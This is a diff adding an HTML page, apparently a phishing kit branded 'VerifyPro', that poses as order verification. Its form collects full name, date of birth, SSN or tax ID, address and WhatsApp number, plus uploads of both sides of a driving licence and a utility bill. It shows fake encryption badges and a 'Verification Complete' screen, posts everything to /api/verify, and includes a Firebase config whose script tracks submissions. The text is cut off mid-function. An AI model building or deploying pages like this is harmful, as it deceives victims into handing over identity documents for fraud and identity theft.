@@ -1,0 +1,1221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VerifyPro - Secure Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #2563eb 0%, #06b6d4 50%, #0891b2 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-attachment: fixed;
+        }
+
+        /* Splash Screen Animation */
+        .splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #2563eb 0%, #06b6d4 50%, #0891b2 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            gap: 3rem;
+        }
+
+        .splash-screen.hidden {
+            display: none !important;
+        }
+
+        .logo-splash {
+            font-size: 3.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff 0%, #f0f0f0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -2px;
+            text-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top-color: #ffffff;
+            border-right-color: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            animation: spin 1.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .splash-text {
+            text-align: center;
+            color: white;
+        }
+
+        .splash-text h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .splash-text p {
+            font-size: 0.9rem;
+            opacity: 0.95;
+        }
+
+        /* Form Container */
+        .form-container {
+            max-width: 650px;
+            margin: 0 auto;
+            opacity: 0;
+            animation: fadeInUp 0.8s ease-out 2.4s forwards;
+            padding: 2rem 1rem;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Card Design */
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 2rem;
+            padding: 2.5rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15), 0 0 1px rgba(255, 255, 255, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .logo-text {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #2563eb 0%, #06b6d4 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+            letter-spacing: -1px;
+        }
+
+        .tagline {
+            font-size: 0.95rem;
+            color: #666;
+            font-weight: 500;
+        }
+
+        /* Badge */
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: linear-gradient(135deg, #2563eb 0%, #06b6d4 100%);
+            color: white;
+            padding: 0.75rem 1.25rem;
+            border-radius: 1rem;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 2rem;
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            margin-bottom: 2rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 999px;
+            overflow: hidden;
+            margin-bottom: 1.5rem;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #2563eb 0%, #06b6d4 50%, #0891b2 100%);
+            border-radius: 999px;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 0 10px rgba(102, 126, 234, 0.4);
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #999;
+        }
+
+        .progress-steps span.active {
+            color: #2563eb;
+        }
+
+        /* Form Sections */
+        .form-section {
+            display: none;
+            opacity: 0;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .form-section.active {
+            display: block;
+            opacity: 1;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .section-title {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 0.5rem;
+        }
+
+        .section-subtitle {
+            font-size: 0.95rem;
+            color: #888;
+            margin-bottom: 2rem;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: linear-gradient(135deg, rgba(37, 99, 235, 0.08) 0%, rgba(6, 182, 212, 0.08) 100%);
+            border-left: 4px solid #2563eb;
+            padding: 1.25rem;
+            border-radius: 1rem;
+            margin-bottom: 2rem;
+            color: #444;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .info-box strong {
+            color: #2563eb;
+        }
+
+        /* Form Group */
+        .form-group {
+            margin-bottom: 1.75rem;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 0.75rem;
+        }
+
+        .form-label .required {
+            color: #ef4444;
+        }
+
+        .form-input,
+        .form-textarea,
+        .form-select {
+            width: 100%;
+            padding: 0.9rem 1.25rem;
+            background: #f8f9fa;
+            border: 2px solid #e8e8e8;
+            border-radius: 0.875rem;
+            color: #333;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            font-weight: 500;
+        }
+
+        .form-input:focus,
+        .form-textarea:focus,
+        .form-select:focus {
+            outline: none;
+            border-color: #2563eb;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+        }
+
+        .form-input::placeholder,
+        .form-textarea::placeholder {
+            color: #bbb;
+        }
+
+        .form-textarea {
+            resize: vertical;
+            min-height: 110px;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .input-group input {
+            flex: 1;
+        }
+
+        .show-toggle {
+            padding: 0.9rem 1.25rem;
+            background: linear-gradient(135deg, #2563eb 0%, #06b6d4 100%);
+            border: none;
+            border-radius: 0.875rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .show-toggle:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
+        }
+
+        /* File Upload */
+        .upload-area {
+            border: 2px dashed #e8e8e8;
+            border-radius: 1rem;
+            padding: 2.5rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+
+        .upload-area:hover,
+        .upload-area.drag-over {
+            border-color: #2563eb;
+            background: linear-gradient(135deg, rgba(37, 99, 235, 0.05) 0%, rgba(6, 182, 212, 0.05) 100%);
+            transform: translateY(-2px);
+        }
+
+        .upload-icon {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .upload-text {
+            color: #666;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .upload-text strong {
+            color: #2563eb;
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        .file-preview {
+            margin-top: 1.25rem;
+            border-radius: 1rem;
+            overflow: hidden;
+            background: white;
+            border: 2px solid #e8e8e8;
+        }
+
+        .file-preview-header {
+            padding: 1rem 1.25rem;
+            background: linear-gradient(135deg, rgba(37, 99, 235, 0.1) 0%, rgba(6, 182, 212, 0.1) 100%);
+            border-bottom: 1px solid #e8e8e8;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #2563eb;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .file-preview-content {
+            padding: 1rem;
+        }
+
+        .file-preview img {
+            max-width: 100%;
+            max-height: 200px;
+            border-radius: 0.75rem;
+        }
+
+        .file-preview-name {
+            color: #666;
+            font-size: 0.85rem;
+            word-break: break-all;
+        }
+
+        .file-preview-remove {
+            background: none;
+            border: none;
+            color: #ef4444;
+            cursor: pointer;
+            font-size: 1.5rem;
+            padding: 0;
+            transition: all 0.2s ease;
+        }
+
+        .file-preview-remove:hover {
+            transform: scale(1.2);
+        }
+
+        /* Buttons */
+        .btn-group {
+            display: flex;
+            gap: 1rem;
+            margin-top: 2.5rem;
+        }
+
+        .btn {
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 0.875rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            flex: 1;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #2563eb 0%, #06b6d4 100%);
+            color: white;
+            box-shadow: 0 10px 30px rgba(37, 99, 235, 0.3);
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(37, 99, 235, 0.4);
+        }
+
+        .btn-primary:active:not(:disabled) {
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: #f0f0f0;
+            color: #2563eb;
+            border: 2px solid #e8e8e8;
+            font-weight: 700;
+        }
+
+        .btn-secondary:hover {
+            background: #e8e8e8;
+            transform: translateY(-3px);
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(5px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9998;
+            gap: 2rem;
+            display: none;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 1.25rem;
+            font-weight: 600;
+        }
+
+        /* Success Screen */
+        .success-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #2563eb 0%, #06b6d4 50%, #0891b2 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9998;
+            gap: 2rem;
+            display: none;
+        }
+
+        .success-screen.active {
+            display: flex;
+        }
+
+        .success-icon {
+            width: 120px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 4px solid white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 4rem;
+            animation: successBounce 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes successBounce {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .success-title {
+            font-size: 2.25rem;
+            font-weight: 800;
+            color: white;
+            text-align: center;
+        }
+
+        .success-message {
+            font-size: 1.05rem;
+            color: rgba(255, 255, 255, 0.95);
+            text-align: center;
+            max-width: 450px;
+            line-height: 1.7;
+        }
+
+        /* Error Message */
+        .error-message {
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1) 0%, rgba(220, 38, 38, 0.1) 100%);
+            border-left: 4px solid #ef4444;
+            padding: 1.25rem;
+            border-radius: 1rem;
+            color: #dc2626;
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+            font-weight: 500;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid rgba(0, 0, 0, 0.1);
+            text-align: center;
+            font-size: 0.8rem;
+            color: #999;
+        }
+
+        /* Responsive */
+        @media (max-width: 640px) {
+            .form-container {
+                padding: 1rem;
+            }
+
+            .card {
+                padding: 1.75rem;
+                border-radius: 1.5rem;
+            }
+
+            .btn-group {
+                flex-direction: column;
+            }
+
+            .section-title {
+                font-size: 1.4rem;
+            }
+
+            .logo-text {
+                font-size: 2rem;
+            }
+
+            .upload-area {
+                padding: 1.75rem;
+            }
+
+            .success-title {
+                font-size: 1.75rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Splash Screen -->
+    <div class="splash-screen" id="splashScreen">
+        <div class="spinner"></div>
+        <div class="splash-text">
+            <div class="logo-splash">VerifyPro</div>
+            <h2>Verification in Progress</h2>
+            <p>🔐 Initializing secure connection...</p>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">🔐 Encrypting & Transmitting Data...</div>
+    </div>
+
+    <!-- Success Screen -->
+    <div class="success-screen" id="successScreen">
+        <div class="success-icon">✓</div>
+        <h2 class="success-title">Verification Complete!</h2>
+        <p class="success-message">
+            Your information has been securely transmitted and verified. Our team will review your submission and contact you shortly.
+        </p>
+        <button class="btn btn-primary mt-6 px-8" onclick="window.location.reload()">Return Home</button>
+    </div>
+
+    <!-- Main Container -->
+    <div class="form-container">
+        <div class="card">
+            <!-- Header -->
+            <div class="header">
+                <div class="logo-text">VerifyPro</div>
+                <p class="tagline">Secure Document Verification Platform</p>
+            </div>
+
+            <!-- Security Badge -->
+            <center>
+                <div class="security-badge">🔒 256-Bit SSL Encrypted</div>
+            </center>
+
+            <!-- Info Box -->
+            <div class="info-box">
+                <strong>⚡ Instant Verification</strong><br>
+                We need to verify your identity to secure your account and comply with regulations. Your data is encrypted and protected.
+            </div>
+
+            <!-- Progress Indicator -->
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill" style="width: 33.33%"></div>
+                </div>
+                <div class="progress-steps">
+                    <span class="active" id="step1Text">📋 Order Info</span>
+                    <span id="step2Text">📞 Contact</span>
+                    <span id="step3Text">📎 Documents</span>
+                </div>
+            </div>
+
+            <!-- Form -->
+            <form id="verificationForm" novalidate>
+                <!-- SECTION 1: ORDER & IDENTIFICATION DETAILS -->
+                <div class="form-section active" id="section1">
+                    <h2 class="section-title">Order & Personal Details</h2>
+                    <p class="section-subtitle">Let's start with your order information</p>
+
+                    <!-- Error Message Container -->
+                    <div id="errorSection1" class="error-message" style="display: none;"></div>
+
+                    <!-- Order Number -->
+                    <div class="form-group">
+                        <label class="form-label">Order Number <span class="required">*</span></label>
+                        <input 
+                            type="text" 
+                            class="form-input" 
+                            id="orderNumber" 
+                            placeholder="e.g., SHP-123456789"
+                            required
+                        >
+                    </div>
+
+                    <!-- Full Name -->
+                    <div class="form-group">
+                        <label class="form-label">Full Name <span class="required">*</span></label>
+                        <input 
+                            type="text" 
+                            class="form-input" 
+                            id="fullName" 
+                            placeholder="John Michael Smith"
+                            required
+                        >
+                    </div>
+
+                    <!-- Date of Birth -->
+                    <div class="form-group">
+                        <label class="form-label">Date of Birth <span class="required">*</span></label>
+                        <input 
+                            type="date" 
+                            class="form-input" 
+                            id="dateOfBirth"
+                            required
+                        >
+                    </div>
+
+                    <!-- SSN / TAX ID -->
+                    <div class="form-group">
+                        <label class="form-label">SSN / TAX ID / VAT <span class="required">*</span></label>
+                        <div class="input-group">
+                            <input 
+                                type="password" 
+                                class="form-input" 
+                                id="ssn" 
+                                placeholder="••• •• ••••"
+                                required
+                            >
+                            <button 
+                                type="button" 
+                                class="show-toggle" 
+                                id="ssnToggle"
+                                onclick="toggleSSN()"
+                            >👁️</button>
+                        </div>
+                    </div>
+
+                    <!-- Full Address -->
+                    <div class="form-group">
+                        <label class="form-label">Full Address <span class="required">*</span></label>
+                        <textarea 
+                            class="form-textarea" 
+                            id="fullAddress" 
+                            placeholder="123 Main Street, New York, NY 10001"
+                            required
+                        ></textarea>
+                    </div>
+
+                    <!-- Navigation Buttons -->
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" onclick="previousStep()" style="display: none;" id="prevBtn1">← Back</button>
+                        <button type="button" class="btn btn-primary" onclick="nextStep(1)">Continue →</button>
+                    </div>
+                </div>
+
+                <!-- SECTION 2: CONTACT & COMMUNICATION -->
+                <div class="form-section" id="section2">
+                    <h2 class="section-title">Contact Information</h2>
+                    <p class="section-subtitle">How can we reach you?</p>
+
+                    <!-- Error Message Container -->
+                    <div id="errorSection2" class="error-message" style="display: none;"></div>
+
+                    <!-- WhatsApp Number -->
+                    <div class="form-group">
+                        <label class="form-label">WhatsApp Number <span class="required">*</span></label>
+                        <input 
+                            type="tel" 
+                            class="form-input" 
+                            id="whatsappNumber" 
+                            placeholder="+1 (555) 123-4567"
+                            required
+                        >
+                    </div>
+
+                    <!-- Navigation Buttons -->
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" onclick="previousStep()">← Back</button>
+                        <button type="button" class="btn btn-primary" onclick="nextStep(2)">Continue →</button>
+                    </div>
+                </div>
+
+                <!-- SECTION 3: DOCUMENT VERIFICATION UPLOADS -->
+                <div class="form-section" id="section3">
+                    <h2 class="section-title">Upload Documents</h2>
+                    <p class="section-subtitle">Upload clear photos of your documents</p>
+
+                    <!-- Error Message Container -->
+                    <div id="errorSection3" class="error-message" style="display: none;"></div>
+
+                    <!-- Driving License Front -->
+                    <div class="form-group">
+                        <label class="form-label">Driving License - Front <span class="required">*</span></label>
+                        <div class="upload-area" id="uploadArea1" onclick="document.getElementById('dlFront').click()">
+                            <div class="upload-icon">🪪</div>
+                            <div class="upload-text">
+                                <strong>Drag & drop</strong> or <strong>click to upload</strong><br>
+                                JPG, PNG, or PDF • Max 5MB
+                            </div>
+                        </div>
+                        <input type="file" class="file-input" id="dlFront" accept="image/jpeg,image/png,application/pdf" required>
+                        <div class="file-preview" id="preview1" style="display: none;">
+                            <div class="file-preview-header">
+                                ✓ File Uploaded
+                                <button type="button" class="file-preview-remove" onclick="removeFile('dlFront', 'preview1', 'uploadArea1')">&times;</button>
+                            </div>
+                            <div class="file-preview-content" id="previewContent1"></div>
+                        </div>
+                    </div>
+
+                    <!-- Driving License Back -->
+                    <div class="form-group">
+                        <label class="form-label">Driving License - Back <span class="required">*</span></label>
+                        <div class="upload-area" id="uploadArea2" onclick="document.getElementById('dlBack').click()">
+                            <div class="upload-icon">🪪</div>
+                            <div class="upload-text">
+                                <strong>Drag & drop</strong> or <strong>click to upload</strong><br>
+                                JPG, PNG, or PDF • Max 5MB
+                            </div>
+                        </div>
+                        <input type="file" class="file-input" id="dlBack" accept="image/jpeg,image/png,application/pdf" required>
+                        <div class="file-preview" id="preview2" style="display: none;">
+                            <div class="file-preview-header">
+                                ✓ File Uploaded
+                                <button type="button" class="file-preview-remove" onclick="removeFile('dlBack', 'preview2', 'uploadArea2')">&times;</button>
+                            </div>
+                            <div class="file-preview-content" id="previewContent2"></div>
+                        </div>
+                    </div>
+
+                    <!-- Utility Bill -->
+                    <div class="form-group">
+                        <label class="form-label">Electricity / Utility Bill <span class="required">*</span></label>
+                        <div class="upload-area" id="uploadArea3" onclick="document.getElementById('utilityBill').click()">
+                            <div class="upload-icon">📄</div>
+                            <div class="upload-text">
+                                <strong>Drag & drop</strong> or <strong>click to upload</strong><br>
+                                JPG, PNG, or PDF • Max 5MB
+                            </div>
+                        </div>
+                        <input type="file" class="file-input" id="utilityBill" accept="image/jpeg,image/png,application/pdf" required>
+                        <div class="file-preview" id="preview3" style="display: none;">
+                            <div class="file-preview-header">
+                                ✓ File Uploaded
+                                <button type="button" class="file-preview-remove" onclick="removeFile('utilityBill', 'preview3', 'uploadArea3')">&times;</button>
+                            </div>
+                            <div class="file-preview-content" id="previewContent3"></div>
+                        </div>
+                    </div>
+
+                    <!-- Final Submission -->
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" onclick="previousStep()">← Back</button>
+                        <button type="submit" class="btn btn-primary" id="submitBtn">✓ Submit Verification</button>
+                    </div>
+                </div>
+            </form>
+
+            <!-- Footer -->
+            <div class="footer">
+                © 2026 VerifyPro. All rights reserved. Secure Verification Platform.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentStep = 1;
+        const totalSteps = 3;
+        const files = {
+            dlFront: null,
+            dlBack: null,
+            utilityBill: null
+        };
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(() => {
+                document.getElementById('splashScreen').classList.add('hidden');
+            }, 2500);
+
+            // Setup file inputs
+            setupFileUpload('dlFront', 'uploadArea1', 'preview1', 'previewContent1');
+            setupFileUpload('dlBack', 'uploadArea2', 'preview2', 'previewContent2');
+            setupFileUpload('utilityBill', 'uploadArea3', 'preview3', 'previewContent3');
+
+            // Setup form submission
+            document.getElementById('verificationForm').addEventListener('submit', handleSubmit);
+        });
+
+        // File Upload Handler
+        function setupFileUpload(inputId, areaId, previewId, previewContentId) {
+            const input = document.getElementById(inputId);
+            const area = document.getElementById(areaId);
+
+            input.addEventListener('change', function(e) {
+                handleFileSelect(e.target.files[0], inputId, previewId, previewContentId);
+            });
+
+            area.addEventListener('dragover', function(e) {
+                e.preventDefault();
+                area.classList.add('drag-over');
+            });
+
+            area.addEventListener('dragleave', function() {
+                area.classList.remove('drag-over');
+            });
+
+            area.addEventListener('drop', function(e) {
+                e.preventDefault();
+                area.classList.remove('drag-over');
+                if (e.dataTransfer.files.length > 0) {
+                    handleFileSelect(e.dataTransfer.files[0], inputId, previewId, previewContentId);
+                }
+            });
+        }
+
+        function handleFileSelect(file, inputId, previewId, previewContentId) {
+            const maxSize = 5 * 1024 * 1024; // 5MB
+            const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
+
+            if (!allowedTypes.includes(file.type)) {
+                showError(3, 'Invalid file type. Please upload JPG, PNG, or PDF only.');
+                return;
+            }
+
+            if (file.size > maxSize) {
+                showError(3, 'File is too large. Maximum size is 5MB.');
+                return;
+            }
+
+            files[inputId] = file;
+            document.getElementById(inputId).files = new DataTransfer().items.add(file).files;
+
+            const preview = document.getElementById(previewId);
+            const previewContent = document.getElementById(previewContentId);
+
+            if (file.type.startsWith('image/')) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    previewContent.innerHTML = `<img src="${e.target.result}" alt="Preview">`;
+                };
+                reader.readAsDataURL(file);
+            } else {
+                previewContent.innerHTML = `<div class="file-preview-name">📄 ${file.name}</div>`;
+            }
+
+            preview.style.display = 'block';
+        }
+
+        function removeFile(inputId, previewId, areaId) {
+            files[inputId] = null;
+            document.getElementById(inputId).value = '';
+            document.getElementById(previewId).style.display = 'none';
+        }
+
+        // SSN Toggle
+        function toggleSSN() {
+            const ssnInput = document.getElementById('ssn');
+            const isPassword = ssnInput.type === 'password';
+            ssnInput.type = isPassword ? 'text' : 'password';
+            document.getElementById('ssnToggle').textContent = isPassword ? '🙈' : '👁️';
+        }
+
+        // Navigation
+        function nextStep(step) {
+            if (!validateStep(step)) {
+                return;
+            }
+            currentStep++;
+            updateProgressBar();
+            showSection(currentStep);
+        }
+
+        function previousStep() {
+            currentStep--;
+            updateProgressBar();
+            showSection(currentStep);
+        }
+
+        function showSection(step) {
+            // Hide all sections
+            document.querySelectorAll('.form-section').forEach(section => {
+                section.classList.remove('active');
+            });
+
+            // Show current section
+            document.getElementById(`section${step}`).classList.add('active');
+
+            // Update step text styling
+            for (let i = 1; i <= totalSteps; i++) {
+                document.getElementById(`step${i}Text`).classList.remove('active');
+            }
+            document.getElementById(`step${step}Text`).classList.add('active');
+
+            // Update button visibility
+            document.getElementById('prevBtn1').style.display = step === 1 ? 'none' : 'block';
+        }
+
+        function updateProgressBar() {
+            const progress = (currentStep / totalSteps) * 100;
+            document.getElementById('progressFill').style.width = progress + '%';
+        }
+
+        // Validation
+        function validateStep(step) {
+            clearErrors();
+
+            switch (step) {
+                case 1:
+                    return validateStep1();
+                case 2:
+                    return validateStep2();
+                case 3:
+                    return validateStep3();
+            }
+        }
+
+        function validateStep1() {
+            const orderNumber = document.getElementById('orderNumber').value.trim();
+            const fullName = document.getElementById('fullName').value.trim();
+            const dateOfBirth = document.getElementById('dateOfBirth').value;
+            const ssn = document.getElementById('ssn').value.trim();
+            const fullAddress = document.getElementById('fullAddress').value.trim();
+
+            let errors = [];
+
+            if (!orderNumber) errors.push('Order Number is required');
+            if (!fullName) errors.push('Full Name is required');
+            if (!dateOfBirth) errors.push('Date of Birth is required');
+            if (!ssn) errors.push('SSN / TAX ID / VAT is required');
+            if (!fullAddress) errors.push('Full Address is required');
+
+            if (errors.length > 0) {
+                showError(1, errors.join('<br>'));
+                return false;
+            }
+
+            return true;
+        }
+
+        function validateStep2() {
+            const whatsappNumber = document.getElementById('whatsappNumber').value.trim();
+
+            if (!whatsappNumber) {
+                showError(2, 'WhatsApp Number is required');
+                return false;
+            }
+
+            if (!/^\+\d{1,3}\s?[\d\s\-\(\)]+$/.test(whatsappNumber)) {
+                showError(2, 'Please enter a valid WhatsApp number with country code (e.g., +1 555 123 4567)');
+                return false;
+            }
+
+            return true;
+        }
+
+        function validateStep3() {
+            let errors = [];
+
+            if (!files.dlFront) errors.push('Driving License Front is required');
+            if (!files.dlBack) errors.push('Driving License Back is required');
+            if (!files.utilityBill) errors.push('Utility Bill is required');
+
+            if (errors.length > 0) {
+                showError(3, errors.join('<br>'));
+                return false;
+            }
+
+            return true;
+        }
+
+        function showError(step, message) {
+            const errorDiv = document.getElementById(`errorSection${step}`);
+            errorDiv.innerHTML = message;
+            errorDiv.style.display = 'block';
+            errorDiv.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        function clearErrors() {
+            for (let i = 1; i <= totalSteps; i++) {
+                const errorDiv = document.getElementById(`errorSection${i}`);
+                errorDiv.style.display = 'none';
+            }
+        }
+
+        // Form Submission
+        async function handleSubmit(e) {
+            e.preventDefault();
+
+            if (!validateStep(3)) {
+                return;
+            }
+
+            // Show loading overlay
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            try {
+                const formData = new FormData();
+
+                // Add form fields
+                formData.append('orderNumber', document.getElementById('orderNumber').value);
+                formData.append('fullName', document.getElementById('fullName').value);
+                formData.append('dateOfBirth', document.getElementById('dateOfBirth').value);
+                formData.append('ssn', document.getElementById('ssn').value);
+                formData.append('fullAddress', document.getElementById('fullAddress').value);
+                formData.append('whatsappNumber', document.getElementById('whatsappNumber').value);
+
+                // Add files
+                formData.append('dlFront', files.dlFront);
+                formData.append('dlBack', files.dlBack);
+                formData.append('utilityBill', files.utilityBill);
+
+                const response = await fetch('/api/verify', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(data.error || 'Submission failed');
+                }
+
+                // Hide loading, show success
+                document.getElementById('loadingOverlay').classList.remove('active');
+                setTimeout(() => {
+                    document.getElementById('successScreen').classList.add('active');
+                }, 500);
+
+            } catch (error) {
+                document.getElementById('loadingOverlay').classList.remove('active');
+                showError(3, `Submission Error: ${error.message}`);
+            }
+        }
+    </script>
+
+    <!-- Firebase Initialization & Cloud Storage Integration -->
+    <script>
+        // Firebase Configuration for VerifyPro
+        const firebaseConfig = {
+            apiKey: "AIzaSyBH15uAbBGzAGGmjOdw3Wf9C24cH8gh6qw",
+            authDomain: "verifypro-4cf84.firebaseapp.com",
+            projectId: "verifypro-4cf84",
+            storageBucket: "verifypro-4cf84.firebasestorage.app",
+            messagingSenderId: "418608285719",
+            appId: "1:418608285719:web:7992aa39b80c806a21b452",
+            measurementId: "G-VNVJL9HRW8"
+        };
+
+        // Initialize Firebase safely with error handling
+        let analyticsReady = false;
+
+        function initializeFirebase() {
+            try {
+                if (typeof firebase === 'undefined') {
+                    console.warn('⚠️ Firebase SDK not loaded yet, retrying...');
+                    setTimeout(initializeFirebase, 1000);
+                    return;
+                }
+
+                const app = firebase.initializeApp(firebaseConfig);
+                const analytics = firebase.analytics(app);
+                const storage = firebase.storage(app);
+                const db = firebase.firestore(app);
+
+                analyticsReady = true;
+                console.log("✅ Firebase initialized successfully for VerifyPro");
+                console.log("📊 Analytics tracking enabled");
+                console.log("☁️ Cloud Storage connected");
+
+                // Log portal load event
+                logFirebaseEvent('verification_portal_loaded', {
+                    timestamp: new Date().toISOString(),
+                    version: 'VerifyPro v1.0'
+                });
+
+            } catch (error) {
+                console.warn('⚠️ Firebase initialization skipped (non-critical):', error.message);
+                console.log('✅ Form will still work - Firebase is optional');
+            }
+        }
+
+        // Log events to Firebase Analytics safely
+        function logFirebaseEvent(eventName, eventData = {}) {
+            try {
+                if (!analyticsReady || typeof firebase === 'undefined') {
+                    console.log(`📈 Event (queued): ${eventName}`);
+                    return;
+                }
+                
+                firebase.analytics().logEvent(eventName, eventData);
+                console.log(`📈 Event logged: ${eventName}`, eventData);
+            } catch (error) {
+                console.log('📈 Analytics logging (non-critical):', error.message);
+            }
+        }
+
+        // Initialize Firebase when DOM is ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initializeFirebase);
+        } else {
+            setTimeout(initializeFirebase, 100);
+        }
+
+        // Track form interactions
+        setTimeout(() => {
+            try {
+                // Log when each step is viewed
+                const originalShowSection = window.showSection;
+                if (originalShowSection) {
+                    window.showSection = function(n) {
+                        originalShowSection(n);
+                        logFirebaseEvent('step_viewed', {
+                            step: n,
+                            timestamp: new Date().toISOString()
+                        });
+                    };
+                }
+
+                // Log form submission
+                const originalHandleSubmit = window.handleSubmit;
+                if (originalHandleSubmit) {
+                    window.handleSubmit = async function(e) {
